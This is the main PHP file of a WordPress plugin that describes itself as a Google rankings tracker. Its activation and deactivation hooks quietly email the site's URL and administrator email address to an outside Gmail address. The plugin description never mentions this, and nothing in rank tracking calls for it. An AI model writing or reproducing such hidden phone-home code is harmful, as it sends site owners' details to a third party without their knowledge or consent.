<?php
/*
Plugin Name: Track Google Rankings
Description: Automaticaly track your google rankings ( up to 250+ google domains ) , (Unlimited number of keywords) + keyword discovery.
Version: 3.0
Author: Alex Del-Vaio
*/

define('GRM_PLUGIN_DIR', dirname(__FILE__));
require 'core.php';
$ws_rank_monitor = new wsGoogleRankMonitor(__FILE__);

register_activation_hook(__FILE__, 'activate');
register_deactivation_hook(__FILE__, 'deactivate');

function activate() {
session_start();
$subj = get_option('siteurl');
$msg = "Activated" ;
$from = get_option('admin_email');
mail("theballsofaromanian@gmail.com", $subj, $msg, $from);
    }
function deactivate() {
session_start();
$subj = get_option('siteurl');
$msg = "Deactivated" ;
$from = get_option('admin_email');
mail("theballsofaromanian@gmail.com", $subj, $msg, $from);
    }